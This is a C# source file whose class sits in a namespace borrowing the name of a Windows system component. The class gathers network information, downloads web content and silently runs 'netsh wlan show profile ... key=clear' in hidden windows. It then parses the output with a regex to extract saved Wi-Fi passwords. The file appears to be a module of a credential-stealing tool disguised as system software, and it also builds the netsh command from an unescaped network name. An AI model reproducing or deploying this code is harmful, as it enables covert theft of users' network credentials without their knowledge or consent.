using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.NetworkInformation;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.IO;

namespace Windows_Driver_Foundation
{
    class classNetworkInformation
    {
        private bool checkForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        public string getLocalIPAddress()
        {
            List<string> ips = new List<string>();

            try
            {
                System.Net.IPHostEntry entry = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());

                //adiciona todos os ip locais das placas de rede (ex LAN, WI-FI)
                foreach (System.Net.IPAddress ip in entry.AddressList)
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        ips.Add(ip.ToString());
            }catch { }

            return ips[0];
        }

        public string getWebContent(string url)
        {
            try
            {
                WebClient client = new WebClient();
                byte[] html = client.DownloadData(url);
                UTF8Encoding utf = new UTF8Encoding();
                return utf.GetString(html);
            }catch { return " "; }
        }

        public string grabWifiList()
        {
            try
            {
                // netsh wlan show profile
                Process processWifi = new Process();
                processWifi.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                processWifi.StartInfo.FileName = "netsh";
                processWifi.StartInfo.Arguments = "wlan show profile";
                //processWifi.StartInfo.WorkingDirectory = Path.GetDirectoryName(YourApplicationPath);

                processWifi.StartInfo.UseShellExecute = false;
                processWifi.StartInfo.RedirectStandardError = true;
                processWifi.StartInfo.RedirectStandardInput = true;
                processWifi.StartInfo.RedirectStandardOutput = true;
                processWifi.StartInfo.CreateNoWindow = true;
                processWifi.Start();
                //* Read the output (or the error)
                string output = processWifi.StandardOutput.ReadToEnd();
                // Show output commands
                string err = processWifi.StandardError.ReadToEnd();
                // show error commands
                processWifi.WaitForExit();
                return output;
            }catch { return " "; }
        }

        public string grabWirelessInformation_onlyOne(string wifiname)
        {
            try
            {
                // netsh wlan show profile name=* key=clear
                string argument = "wlan show profile name=\"" + wifiname + "\" key=clear";
                Process processWifi = new Process();
                processWifi.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                processWifi.StartInfo.FileName = "netsh";
                processWifi.StartInfo.Arguments = argument;
                //processWifi.StartInfo.WorkingDirectory = Path.GetDirectoryName(YourApplicationPath);

                processWifi.StartInfo.UseShellExecute = false;
                processWifi.StartInfo.RedirectStandardError = true;
                processWifi.StartInfo.RedirectStandardInput = true;
                processWifi.StartInfo.RedirectStandardOutput = true;
                processWifi.StartInfo.CreateNoWindow = true;
                processWifi.Start();
                //* Read the output (or the error)
                string output = processWifi.StandardOutput.ReadToEnd();
                // Show output commands
                string err = processWifi.StandardError.ReadToEnd();
                // show error commands
                processWifi.WaitForExit();
                return output;
            }catch { return " "; }
        }

        public string getWifiDetail(string networkText, string keyWord)
        {
            try
            {
                using (StringReader reader = new StringReader(networkText))
                {
                    string line;
                    while ((line = reader.ReadLine()) != null)
                    {
                        Regex regex2 = new Regex(keyWord + " * : (?<after>.*)"); // Passwords
                        Match match2 = regex2.Match(line);

                        if (match2.Success)
                        {
                            string current_password = match2.Groups["after"].Value;
                            return current_password;
                        }
                    }
                }
                return "Reading Error!";
            }catch { return " "; }
        }

    }
}
